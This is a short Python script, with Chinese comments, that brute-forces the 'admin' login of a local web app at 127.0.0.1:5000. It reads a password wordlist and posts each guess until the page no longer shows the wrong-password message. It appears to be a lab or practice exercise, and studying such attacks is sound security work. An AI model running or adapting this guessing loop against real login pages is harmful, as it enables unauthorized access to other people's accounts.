import requests
import time
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from path import passwd_path
# 目標伺服器登入頁面
url = "http://127.0.0.1:5000/login"

# 固定帳號
username = "admin"

# 載入整份密碼字典
with open(passwd_path, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"🔍 正在測試 {len(passwords):,} 筆密碼...")

start_time = time.time()

for idx, password in enumerate(passwords, start=1):
    try:
        # 傳送帳號與密碼
        response = requests.post(url, data={"username": username, "password": password})

        # 成功關鍵字判斷（只要沒出現錯誤訊息就代表登入成功）
        if "密碼錯誤！" not in response.text:
            print(f"\n🎉 成功破解！帳號: {username} 密碼: {password}")
            print(f"共嘗試 {idx} 次，用時 {time.time() - start_time:.2f} 秒")
            break
        elif idx % 100 == 0:
            print(f"嘗試第 {idx} 筆密碼: {password}")

    except Exception as e:
        print(f"⚠️ 嘗試第 {idx} 筆失敗: {e}")
        continue

else:
    print("\n🚫 字典中沒有正確密碼")
